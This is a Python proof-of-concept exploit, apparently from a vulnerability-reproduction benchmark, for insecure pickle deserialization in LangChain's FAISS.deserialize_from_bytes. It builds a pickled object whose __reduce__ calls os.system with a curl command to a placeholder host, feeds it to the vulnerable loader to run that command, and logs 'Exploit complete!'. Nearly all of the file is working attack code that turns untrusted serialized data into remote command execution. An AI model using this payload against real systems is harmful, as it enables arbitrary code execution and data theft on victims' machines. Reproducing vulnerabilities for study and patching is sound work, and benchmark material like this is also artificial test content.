#!/usr/bin/env python3
import pickle
import os
import base64
import sys

# Add the local langchain directory to the Python path to leverage vulnerable files 
sys.path.insert(0, os.path.abspath("../../../codebase/libs/community"))

from langchain_community.embeddings.huggingface import HuggingFaceEmbeddings
from langchain_community.vectorstores import FAISS

LOG_FILE = "exploit.log"

def add_padding(base64_string):
    missing_padding = len(base64_string) % 4
    if missing_padding:
        base64_string += '=' * (4 - missing_padding)
    return base64_string

class Test(object):

    def __init__(self):
        self.a = 1

    def __reduce__(self):
        return (os.system, ('curl http://example.com/test',))

if __name__ == '__main__':
    try:
        tmp = Test()
        payload = (tmp, None, None)
        data = pickle.dumps(payload)
        encoded_data = base64.b64encode(data).decode()

        embeddings = HuggingFaceEmbeddings(model_name="all-MiniLM-L6-v2")
        
        # Adding padding to ensure proper decoding
        padded_data = add_padding(encoded_data)

        FAISS.deserialize_from_bytes(
            embeddings=embeddings, serialized=base64.b64decode(padded_data)
        )
        
        log_file_path = os.path.join(os.path.dirname(__file__), 'exploit.log')
        with open(log_file_path, 'w') as log_file:
            log_file.write("Exploit complete!\n")
    except Exception as e:
        # Write error message to log
        with open(LOG_FILE, "w") as log:
            log.write(f"An error occurred: {e}\n")